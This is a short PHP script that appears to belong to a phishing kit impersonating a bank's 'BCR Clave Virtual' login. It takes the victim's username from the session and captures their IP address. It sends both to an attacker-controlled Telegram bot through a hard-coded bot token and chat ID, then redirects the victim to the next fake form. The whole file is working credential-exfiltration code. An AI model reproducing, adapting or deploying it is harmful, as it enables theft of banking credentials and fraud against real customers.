<?php
session_start();

$usuario = $_SESSION['usuario'] ?? 'desconocido';

function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

$token = "7490119561:AAGJmnLToplJQ3FamNGMU6RKVSnSqsQ5g9c";
$chat_id = "5157616506";

$mensaje = "🔐 BCR Clave Virtual\n👤 Usuario: $usuario\n🌐 IP: $ip";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
  "chat_id" => $chat_id,
  "text" => $mensaje
]));

// Redirigir al cliente al formulario virtual
header("Location: virtual.php");
exit;
?>
